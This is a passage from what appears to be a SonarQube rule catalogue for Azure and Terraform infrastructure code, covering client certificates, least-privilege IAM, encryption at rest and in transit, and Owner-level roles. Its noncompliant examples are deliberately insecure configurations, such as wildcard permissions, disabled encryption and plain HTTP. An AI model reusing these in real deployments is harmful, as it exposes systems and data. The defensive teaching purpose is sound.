  name: 'example'
  properties: {
    clientCertEnabled: true
    clientCertMode: 'Optional' // Sensitive
  }
}
</pre>
<pre data-diff-id="4" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.App/containerApps",
      "apiVersion": "2022-10-01",
      "name": "example",
      "properties": {
        "configuration": {
          "ingress": {
            "clientCertificateMode": "accept"
          }
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="14" data-diff-type="noncompliant">
resource example 'Microsoft.App/containerApps@2022-10-01' = {
  name: 'example'
  properties: {
    configuration: {
      ingress: {
        clientCertificateMode: 'accept' // Sensitive
      }
    }
  }
}
</pre>
<p>Where client certificates can be used to authenticate outbound requests, such as:</p>
<ul>
  <li> <code>Microsoft.DataFactory/factories/linkedservices</code> with <a
  href="https://learn.microsoft.com/en-us/azure/templates/microsoft.datafactory/factories/linkedservices?pivots=deployment-language-arm-template#httplinkedservicetypeproperties">typeProperties → authenticationType</a> where the request type is <code>Web</code> or <code>HttpServer</code> </li>
  <li> <code>Microsoft.DataFactory/factories/pipelines</code> with <a
  href="https://learn.microsoft.com/en-us/azure/templates/microsoft.datafactory/factories/pipelines?pivots=deployment-language-arm-template#webactivityauthentication">activites → typeProperties → authentication → type</a> where the activity type is <code>WebActivity</code> or <code>WebHook</code> </li>
  <li> <code>Microsoft.Scheduler/jobCollections/jobs</code> with <a
  href="https://learn.microsoft.com/en-us/azure/templates/microsoft.scheduler/jobcollections/jobs?pivots=deployment-language-arm-template#httprequest-1">action → request → authentication → type</a> </li>
  <li> <code>Microsoft.Scheduler/jobCollections/jobs</code> with <a
  href="https://learn.microsoft.com/en-us/azure/templates/microsoft.scheduler/jobcollections/jobs?pivots=deployment-language-arm-template#joberroraction-1">action → errorAction → request → authentication → type</a> </li>
</ul>
<pre data-diff-id="5" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.DataFactory/factories/linkedservices",
      "apiVersion": "2018-06-01",
      "name": "factories/example",
      "properties": {
        "type": "Web",
        "typeProperties": {
          "authenticationType": "Basic"
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="15" data-diff-type="noncompliant">
resource example 'Microsoft.DataFactory/factories/linkedservices@2018-06-01' = {
  name: 'example'
  properties: {
    type: 'Web'
    typeProperties: {
      authenticationType: 'Basic' // Sensitive
    }
  }
}
</pre>
<p>Where a list of permitted client certificates must be provided, such as:</p>
<ul>
  <li> <code>Microsoft.DocumentDB/cassandraClusters</code> with <a
  href="https://learn.microsoft.com/en-us/azure/templates/microsoft.documentdb/cassandraclusters?pivots=deployment-language-arm-template#clusterresourceproperties-1">clientCertificates</a> </li>
  <li> <code>Microsoft.Network/applicationGateways</code> with <a
  href="https://learn.microsoft.com/en-us/azure/templates/microsoft.network/applicationgateways?pivots=deployment-language-arm-template#applicationgatewaypropertiesformat-1">trustedClientCertificates</a> </li>
  <li> <code>Microsoft.ServiceFabric/clusters</code> with <a
  href="https://learn.microsoft.com/en-us/azure/templates/microsoft.servicefabric/clusters?pivots=deployment-language-arm-template#clusterproperties-1">clientCertificateCommonNames</a> or <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.servicefabric/clusters?pivots=deployment-language-arm-template#clusterproperties-1">clientCertificateThumbprints</a> </li>
</ul>
<pre data-diff-id="6" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.DocumentDB/cassandraClusters",
      "apiVersion": "2021-10-15",
      "name": "example",
      "properties": {
        "clientCertificates": []
      }
    }
  ]
}
</pre>
<pre data-diff-id="16" data-diff-type="noncompliant">
resource example 'Microsoft.DocumentDB/cassandraClusters@2021-10-15' = {
  name: 'example'
  properties: {
    clientCertificates: [] // Sensitive
  }
}
</pre>
<p>Where a resouce can use both certificate-based and password-based authentication, such as:</p>
<ul>
  <li> <code>Microsoft.ContainerRegistry/registries/tokens</code> with <a
  href="https://learn.microsoft.com/en-us/azure/templates/microsoft.containerregistry/registries/tokens?pivots=deployment-language-arm-template#tokencredentialsproperties-1">credentials → certficates</a> and <code>credentials</code> → <code>passwords</code> </li>
</ul>
<pre data-diff-id="7" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.ContainerRegistry/registries/tokens",
      "apiVersion": "2022-12-01",
      "name": "registries/example",
      "properties": {
        "credentials": {
          "passwords": [
            {
              "name": "password1"
            }
          ]
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="17" data-diff-type="noncompliant">
resource example 'Microsoft.ContainerRegistry/registries/tokens@2022-12-01' = {
  name: 'example'
  properties: {
    credentials: {
      passwords: [ // Sensitive
        {
          name: 'password1'
        }
      ]
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>Where the use of client certificates is controlled by a boolean value:</p>
<pre data-diff-id="1" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.SignalRService/webPubSub",
      "apiVersion": "2020-07-01-preview",
      "name": "example",
      "properties": {
        "tls": {
          "clientCertEnabled": true
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="11" data-diff-type="compliant">
resource example 'Microsoft.SignalRService/webPubSub@2020-07-01-preview' = {
  name: 'example'
  properties: {
    tls: {
      clientCertEnabled: true
    }
  }
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Web/sites",
      "apiVersion": "2015-08-01",
      "name": "example",
      "properties": {
        "clientCertEnabled": true,
        "clientCertMode": "Required"
      }
    }
  ]
}
</pre>
<pre data-diff-id="12" data-diff-type="compliant">
resource example 'Microsoft.Web/sites@2015-08-01' = {
  name: 'example'
  properties: {
    clientCertEnabled: true
    clientCertMode: 'Required'
  }
}
</pre>
<p>Where the use of client certificates can be made optional:</p>
<pre data-diff-id="3" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Web/sites",
      "apiVersion": "2015-08-01",
      "name": "example",
      "properties": {
        "clientCertEnabled": true,
        "clientCertMode": "Required"
      }
    }
  ]
}
</pre>
<pre data-diff-id="13" data-diff-type="compliant">
resource example 'Microsoft.Web/sites@2015-08-01' = {
  name: 'example'
  properties: {
    clientCertEnabled: true
    clientCertMode: 'Required'
  }
}
</pre>
<pre data-diff-id="4" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.App/containerApps",
      "apiVersion": "2022-10-01",
      "name": "example",
      "properties": {
        "configuration": {
          "ingress": {
            "clientCertificateMode": "require"
          }
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="14" data-diff-type="compliant">
resource example 'Microsoft.App/containerApps@2022-10-01' = {
  name: 'example'
  properties: {
    configuration: {
      ingress: {
        clientCertificateMode: 'require'
      }
    }
  }
}
</pre>
<p>Where client certificates can be used to authenticate outbound requests:</p>
<pre data-diff-id="5" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.DataFactory/factories/linkedservices",
      "apiVersion": "2018-06-01",
      "name": "example",
      "properties": {
        "type": "Web",
        "typeProperties": {
          "authenticationType": "ClientCertificate"
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="15" data-diff-type="compliant">
resource example 'Microsoft.DataFactory/factories/linkedservices@2018-06-01' = {
  name: 'example'
  properties: {
    type: 'Web'
    typeProperties: {
      authenticationType: 'ClientCertificate'
    }
  }
}
</pre>
<p>Where a list of permitted client certificates must be provided:</p>
<pre data-diff-id="6" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.DocumentDB/cassandraClusters",
      "apiVersion": "2021-10-15",
      "name": "example",
      "properties": {
        "clientCertificates": [
          {
            "pem": "[base64-encoded certificate]"
          }
        ]
      }
    }
  ]
}
</pre>
<pre data-diff-id="16" data-diff-type="compliant">
resource example 'Microsoft.DocumentDB/cassandraClusters@2021-10-15' = {
  name: 'example'
  properties: {
    clientCertificates: [
      {
        pem: '[base64-encoded certificate]'
      }
    ]
  }
}
</pre>
<p>Where a resouce can use both certificate-based and password-based authentication:</p>
<pre data-diff-id="7" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.ContainerRegistry/registries/tokens",
      "apiVersion": "2022-12-01",
      "name": "example",
      "properties": {
        "credentials": {
          "certificates": [
            {
              "name": "certificate1",
              "encodedPemCertificate": "[base64-encoded certificate]"
            }
          ]
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="17" data-diff-type="compliant">
resource example 'Microsoft.ContainerRegistry/registries/tokens@2022-12-01' = {
  name: 'example'
  properties: {
    credentials: {
      certificates: [
        {
          name: 'certificate1'
          encodedPemCertificate: '[base64-encoded certificate]'
        }
      ]
    }
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/azure/templates/">Azure Resource Manager templates</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/668">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6304">
              terraform:S6304
            </a>
          </td>
          <td>
            <details>
              <p>A policy that allows identities to access all resources in an AWS account may violate <a
href="https://en.wikipedia.org/wiki/Principle_of_least_privilege">the principle of least privilege</a>. Suppose an identity has permission to access
all resources even though it only requires access to some non-sensitive ones. In this case, unauthorized access and disclosure of sensitive
information will occur.</p>
<h2>Ask Yourself Whether</h2>
<p>The AWS account has more than one resource with different levels of sensitivity.</p>
<p>A risk exists if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to apply the least privilege principle, i.e., by only granting access to necessary resources. A good practice to achieve this is
to organize or <a
href="https://aws.amazon.com/blogs/security/simplify-granting-access-to-your-aws-resources-by-using-tags-on-aws-iam-users-and-roles/">tag</a>
resources depending on the sensitivity level of data they store or process. Therefore, managing a secure access control is less prone to errors.</p>
<h2>Sensitive Code Example</h2>
<p>Update permission is granted for all policies using the wildcard (*) in the <code>Resource</code> property:</p>
<pre>
resource "aws_iam_policy" "noncompliantpolicy" {
  name        = "noncompliantpolicy"

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action = [
          "iam:CreatePolicyVersion"
        ]
        Effect   = "Allow"
        Resource = [
          "*" # Sensitive
        ]
      }
    ]
  })
}
</pre>
<h2>Compliant Solution</h2>
<p>Restrict update permission to the appropriate subset of policies:</p>
<pre>
resource "aws_iam_policy" "compliantpolicy" {
  name        = "compliantpolicy"

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action = [
          "iam:CreatePolicyVersion"
        ]
        Effect   = "Allow"
        Resource = [
          "arn:aws:iam::${data.aws_caller_identity.current.account_id}:policy/team1/*"
        ]
      }
    ]
  })
}
</pre>
<h2>Exceptions</h2>
<ul>
  <li> Should not be raised on key policies (when AWS KMS actions are used.) </li>
  <li> Should not be raised on policies not using any resources (if and only if all actions in the policy never require resources.) </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege">AWS Documentation</a> - Grant least
  privilege </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6388">
              terraform:S6388
            </a>
          </td>
          <td>
            <details>
              <p>Using unencrypted cloud storages can lead to data exposure. In the case that adversaries gain physical access to the storage medium they are able
to access unencrypted information.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The service contains sensitive information that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt cloud storages that contain sensitive information.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/data_lake_store">azurerm_data_lake_store</a>:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
resource "azurerm_data_lake_store" "store" {
  name             = "store"
  encryption_state = "Disabled"  # Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/data_lake_store">azurerm_data_lake_store</a>:</p>
<pre data-diff-id="1" data-diff-type="compliant">
resource "azurerm_data_lake_store" "store" {
  name             = "store"
  encryption_state = "Enabled"
  encryption_type  = "ServiceManaged"
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/efs/latest/ug/encryption.html">Data encryption in Amazon EFS</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
  <li> <a href="https://learn.microsoft.com/en-us/azure/backup/backup-encryption">Encryption in Azure Backup</a> </li>
  <li> <a href="https://learn.microsoft.com/en-us/azure/mysql/single-server/concepts-security">Security in Azure Database for MySQL</a> </li>
  <li> <a href="https://learn.microsoft.com/en-us/azure/postgresql/single-server/concepts-security">Security in Azure Database for PostgreSQL</a>
  </li>
  <li> <a href="https://learn.microsoft.com/en-us/azure/storage/common/infrastructure-encryption-enable?tabs=portal">Infrastructure double encryption
  of data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S5332">
              terraform:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul>
  <li> sensitive data exposure </li>
  <li> traffic redirected to a malicious endpoint </li>
  <li> malware-infected software update or installer </li>
  <li> execution of client-side code </li>
  <li> corruption of critical information </li>
</ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul>
  <li> bypassing isolation mechanisms </li>
  <li> compromising a component of the network </li>
  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>
</ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a
href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169">CVE-2019-6169</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327">CVE-2019-12327</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065">CVE-2019-11065</a> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>
  <li> Application data transits over an untrusted network. </li>
  <li> Compliance rules require the service to encrypt data in transit. </li>
  <li> Your application renders web pages with a relaxed mixed content policy. </li>
  <li> OS-level protections against clear-text traffic are deactivated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul>
      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>
      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>
      <li> Use <code>https</code> instead of <code>http</code>. </li>
      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>
    </ul>  </li>
  <li> Enable encryption of cloud components communications whenever it is possible. </li>
  <li> Configure your application to block mixed content when rendering web pages. </li>
  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>
</ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://aws.amazon.com/kinesis/">AWS Kinesis</a> Data Streams server-side encryption:</p>
<pre>
resource "aws_kinesis_stream" "sensitive_stream" {
    encryption_type = "NONE" # Sensitive
}
</pre>
<p>For <a href="https://aws.amazon.com/elasticache/">Amazon ElastiCache</a>:</p>
<pre>
resource "aws_elasticache_replication_group" "example" {
    replication_group_id = "example"
    replication_group_description = "example"
    transit_encryption_enabled = false  # Sensitive
}
</pre>
<p>For <a href="https://aws.amazon.com/ecs/">Amazon ECS</a>:</p>
<pre>
resource "aws_ecs_task_definition" "ecs_task" {
  family = "service"
  container_definitions = file("task-definition.json")

  volume {
    name = "storage"
    efs_volume_configuration {
      file_system_id = aws_efs_file_system.fs.id
      transit_encryption = "DISABLED"  # Sensitive
    }
  }
}
</pre>
<p>For <a href="https://docs.aws.amazon.com/opensearch-service/index.html">Amazon OpenSearch domains</a>:</p>
<pre>
resource "aws_elasticsearch_domain" "example" {
  domain_name = "example"
  domain_endpoint_options {
    enforce_https = false # Sensitive
  }
  node_to_node_encryption {
    enabled = false # Sensitive
  }
}
</pre>
<p>For <a href="https://aws.amazon.com/msk/">Amazon MSK</a> communications between clients and brokers:</p>
<pre>
resource "aws_msk_cluster" "sensitive_data_cluster" {
    encryption_info {
        encryption_in_transit {
            client_broker = "TLS_PLAINTEXT" # Sensitive
            in_cluster = false # Sensitive
        }
    }
}
</pre>
<p>For <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html">AWS Load Balancer Listeners</a>:</p>
<pre>
resource "aws_lb_listener" "front_load_balancer" {
  protocol = "HTTP" # Sensitive

  default_action {
    type = "redirect"

    redirect {
      protocol = "HTTP"
    }
  }
}
</pre>
<p>HTTP protocol is used for <a
href="https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_region_backend_service">GCP Region Backend
Services</a>:</p>
<pre>
resource "google_compute_region_backend_service" "example" {
  name                            = "example-service"
  region                          = "us-central1"
  health_checks                   = [google_compute_region_health_check.region.id]
  connection_draining_timeout_sec = 10
  session_affinity                = "CLIENT_IP"
  load_balancing_scheme           = "EXTERNAL"
  protocol                        = "HTTP" # Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://aws.amazon.com/kinesis/">AWS Kinesis</a> Data Streams server-side encryption:</p>
<pre>
resource "aws_kinesis_stream" "compliant_stream" {
    encryption_type = "KMS"
}
</pre>
<p>For <a href="https://aws.amazon.com/elasticache/">Amazon ElastiCache</a>:</p>
<pre>
resource "aws_elasticache_replication_group" "example" {
    replication_group_id = "example"
    replication_group_description = "example"
    transit_encryption_enabled = true
}
</pre>
<p>For <a href="https://aws.amazon.com/ecs/">Amazon ECS</a>:</p>
<pre>
resource "aws_ecs_task_definition" "ecs_task" {
  family = "service"
  container_definitions = file("task-definition.json")

  volume {
    name = "storage"
    efs_volume_configuration {
      file_system_id = aws_efs_file_system.fs.id
      transit_encryption = "ENABLED"
    }
  }
}
</pre>
<p>For <a href="https://docs.aws.amazon.com/opensearch-service/index.html">Amazon OpenSearch domains</a>:</p>
<pre>
resource "aws_elasticsearch_domain" "example" {
  domain_name = "example"
  domain_endpoint_options {
    enforce_https = true
  }
  node_to_node_encryption {
    enabled = true
  }
}
</pre>
<p>For <a href="https://aws.amazon.com/msk/">Amazon MSK</a> communications between clients and brokers, data in transit is encrypted by default,
allowing you to omit writing the <code>encryption_in_transit</code> configuration. However, if you need to configure it explicitly, this configuration
is compliant:</p>
<pre>
resource "aws_msk_cluster" "sensitive_data_cluster" {
    encryption_info {
        encryption_in_transit {
            client_broker = "TLS"
            in_cluster = true
        }
    }
}
</pre>
<p>For <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html">AWS Load Balancer Listeners</a>:</p>
<pre>
resource "aws_lb_listener" "front_load_balancer" {
  protocol = "HTTP"

  default_action {
    type = "redirect"

    redirect {
      protocol = "HTTPS"
    }
  }
}
</pre>
<p>HTTPS protocol is used for <a
href="https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_region_backend_service">GCP Region Backend
Services</a>:</p>
<pre>
resource "google_compute_region_backend_service" "example" {
  name                            = "example-service"
  region                          = "us-central1"
  health_checks                   = [google_compute_region_health_check.region.id]
  connection_draining_timeout_sec = 10
  session_affinity                = "CLIENT_IP"
  load_balancing_scheme           = "EXTERNAL"
  protocol                        = "HTTPS"
}
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>
</ul>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/319">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>
  <li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html">Google, Moving towards more secure web</a> </li>
  <li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/">Mozilla, Deprecating non secure http</a> </li>
  <li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li>
  <li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html">AWS
  Documentation</a> - Stream Encryption </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6302">
              terraform:S6302
            </a>
          </td>
          <td>
            <details>
              <p>A policy that grants all permissions may indicate an improper access control, which violates <a
href="https://en.wikipedia.org/wiki/Principle_of_least_privilege">the principle of least privilege</a>. Suppose an identity is granted full
permissions to a resource even though it only requires read permission to work as expected. In this case, an unintentional overwriting of resources
may occur and therefore result in loss of information.</p>
<h2>Ask Yourself Whether</h2>
<p>Identities obtaining all the permissions:</p>
<ul>
  <li> only require a subset of these permissions to perform the intended function. </li>
  <li> have monitored activity showing that only a subset of these permissions is actually used. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to apply the least privilege principle, i.e. by only granting the necessary permissions to identities. A good practice is to start
with the very minimum set of permissions and to refine the policy over time. In order to fix overly permissive policies already deployed in
production, a strategy could be to review the monitored activity in order to reduce the set of permissions to those most used.</p>
<h2>Sensitive Code Example</h2>
<p>A customer-managed policy for AWS that grants all permissions by using the wildcard (*) in the <code>Action</code> property:</p>
<pre>
resource "aws_iam_policy" "example" {
  name = "noncompliantpolicy"

  policy = jsonencode({
    Version   = "2012-10-17"
    Statement = [
      {
        Action   = [
          "*" # Sensitive
        ]
        Effect   = "Allow"
        Resource = [
          aws_s3_bucket.mybucket.arn
        ]
      }
    ]
  })
}
</pre>
<p>A customer-managed policy for GCP that grants all permissions by using the actions admin role <code>role</code> property:</p>
<pre>
resource "google_project_iam_binding" "example" {
  project = "example"
  role    = "roles/owner" # Sensitive

  members = [
    "user:jane@example.com",
  ]
}
</pre>
<h2>Compliant Solution</h2>
<p>A customer-managed policy for AWS that grants only the required permissions:</p>
<pre>
resource "aws_iam_policy" "example" {
  name = "compliantpolicy"

  policy = jsonencode({
    Version   = "2012-10-17"
    Statement = [
      {
        Action   = [
          "s3:GetObject"
        ]
        Effect   = "Allow"
        Resource = [
          aws_s3_bucket.mybucket.arn
        ]
      }
    ]
  })
}
</pre>
<p>A customer-managed policy for GCP that grants restricted permissions by using the actions admin role <code>role</code> property:</p>
<pre>
resource "google_project_iam_binding" "example" {
  project = "example"
  role    = "roles/actions.Viewer"

  members = [
    "user:jane@example.com",
  ]
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege">AWS Documentation</a> - Grant least
  privilege </li>
  <li> <a href="https://cloud.google.com/iam/docs/understanding-roles">Google Cloud Documentation</a> - Understanding roles </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6308">
              terraform:S6308
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elasticsearch Service (ES) is a managed service to host Elasticsearch instances.</p>
<p>To harden domain (cluster) data in case of unauthorized access, ES provides data-at-rest encryption if the Elasticsearch version is 5.1 or above.
Enabling encryption at rest will help protect:</p>
<ul>
  <li> indices </li>
  <li> logs </li>
  <li> swap files </li>
  <li> data in the application directory </li>
  <li> automated snapshots </li>
</ul>
<p>Thus, if adversaries gain physical access to the storage medium, they cannot access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The database contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to encrypt Elasticsearch domains that contain sensitive information.</p>
<p>Encryption and decryption are handled transparently by ES, so no further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain">aws_elasticsearch_domain</a>:</p>
<pre>
resource "aws_elasticsearch_domain" "elasticsearch" {
  encrypt_at_rest {
    enabled = false  # Sensitive, disabled by default
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain">aws_elasticsearch_domain</a>:</p>
<pre>
resource "aws_elasticsearch_domain" "elasticsearch" {
  encrypt_at_rest {
    enabled = true
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/encryption-at-rest.html">AWS Documentation</a> - Encryption of
  data at rest for Amazon Elasticsearch Service </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6385">
              terraform:S6385
            </a>
          </td>
          <td>
            <details>
              <p>Defining a custom role at the <code>Subscription</code> or <code>Management group</code> scope that allows all actions will give it the same
capabilities as the built-in <code>Owner</code> role.</p>
<h2>Why is this an issue?</h2>
<p>In Azure, the <code>Owner</code> role of a <code>Subscription</code> or a <code>Management group</code> provides entities it is assigned to with
the maximum level of privileges. The <code>Owner</code> role allows managing all resources and assigning any role to other entities.</p>
<p>Because it is a powerful entitlement, it should be granted to as few users as possible.</p>
<p>When a custom role has the same level of permissions as the <code>Owner</code> one, there are greater chances that high privileges are granted to
too many users.</p>
<h3>What is the potential impact?</h3>
<p>Custom roles that provide the same level of permissions as <code>Owner</code> might indicate a configuration issue. Any entity assigned with it can
perform any action on the <code>Subscription</code> or <code>Management group</code>, including changing roles and permissions.</p>
<p>If the affected role is unexpectedly assigned to users, they can compromise the affected scope. They can do so in the long term by assigning
dangerous roles to other users or entities.</p>
<p>Depending on the scope to which the role is assignable, the exact impact of a successful exploitation may vary. It generally ranges from data
compromise to the takeover of the cloud infrastructure.</p>
<h4>Infrastructure takeover</h4>
<p>By obtaining the right role, an attacker can gain control over part or all of the Azure infrastructure. They can modify DNS settings, redirect
traffic, or launch malicious instances that can be used for various nefarious activities, including launching DDoS attacks, hosting phishing websites,
or distributing malware. Malicious instances may also be used for resource-intensive tasks such as cryptocurrency mining.</p>
<p>This can result in legal liability, but also increased costs, degraded performance, and potential service disruptions.</p>
<p>Furthermore, corporate Azure infrastructures are often connected to other services and to the internal networks of the organization. Because of
